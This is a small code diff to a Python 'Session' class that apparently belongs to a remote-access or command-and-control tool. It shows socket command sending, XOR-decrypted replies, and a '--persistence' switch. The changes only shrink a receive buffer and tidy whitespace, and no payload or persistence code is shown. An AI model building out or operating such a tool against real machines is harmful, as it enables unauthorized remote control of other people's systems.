@@ -72,7 +72,7 @@ class Session:
        
         if(CheckConn().sendsafe(self.session_nb, self.socket, cmd)): #send data
         
-            CheckConn().recvcommand(self.socket,10000) #XOR  The decryption of xor is automatic on this method.
+            CheckConn().recvcommand(self.socket,4096) #XOR  The decryption of xor is automatic on this method.
             
         else:
             printColor("error","\n[-] An error occurred while sending the command.\n")
@@ -137,11 +137,13 @@ class Session:
                     elif terminal[i] == "-b" or terminal[i] == "--back":
                         printColor("information","[-] Session stop.\n")
                         checker = False
+                    
                     elif terminal[i] == "-p" or terminal[i] == "--persistence":
                         self.lonelyPersistence()
+                    
                     else:
                         pass
-                        print(i)
+                    
                 except IndexError:
                     pass
                     #print("CHHHED")
